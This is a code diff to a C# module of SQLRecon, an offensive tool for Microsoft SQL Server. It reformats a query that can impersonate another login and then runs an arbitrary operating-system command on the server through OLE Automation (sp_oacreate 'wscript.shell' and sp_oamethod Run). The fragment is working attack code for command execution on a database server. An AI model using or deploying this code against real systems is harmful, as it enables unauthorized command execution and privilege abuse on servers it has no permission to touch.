@@ -1,5 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
+using System;
 using System.Data.SqlClient;
 
 namespace SQLRecon.Modules
@@ -41,11 +40,22 @@ namespace SQLRecon.Modules
 
                 if (!impersonate.Equals("null"))
                 {
-                    command = new SqlCommand("EXECUTE AS LOGIN = '" + impersonate + "'; DECLARE @output INT; DECLARE @ProgramToRun VARCHAR(255); SET @ProgramToRun = 'Run(" + cmd + ")'; EXEC sp_oacreate 'wScript.Shell', @output out;  EXEC sp_oamethod @output, @ProgramToRun; EXEC sp_oadestroy @output;", con);
+                    command = new SqlCommand("EXECUTE AS LOGIN = '" + impersonate + "';" +
+                       "DECLARE @output INT; " +
+                       "DECLARE @ProgramToRun VARCHAR(255);" +
+                       "SET @ProgramToRun = 'Run(\"" + cmd + "\")';" +
+                       "EXEC sp_oacreate 'wscript.shell', @output out;" +
+                       "EXEC sp_oamethod @output, @ProgramToRun;" +
+                       "EXEC sp_oadestroy @output;", con);
                 }
                 else
                 {
-                    command = new SqlCommand("DECLARE @output INT; DECLARE @ProgramToRun VARCHAR(255); SET @ProgramToRun = 'Run(" + cmd + ")'; EXEC sp_oacreate 'wScript.Shell', @output out;  EXEC sp_oamethod @output, @ProgramToRun; EXEC sp_oadestroy @output;", con);
+                   command = new SqlCommand("DECLARE @output INT; " +
+                       "DECLARE @ProgramToRun VARCHAR(255);" +
+                       "SET @ProgramToRun = 'Run(\"" + cmd + "\")';" +
+                       "EXEC sp_oacreate 'wscript.shell', @output out;" +
+                       "EXEC sp_oamethod @output, @ProgramToRun;" +
+                       "EXEC sp_oadestroy @output;", con);   
                 }
 
                 SqlDataReader reader = command.ExecuteReader();
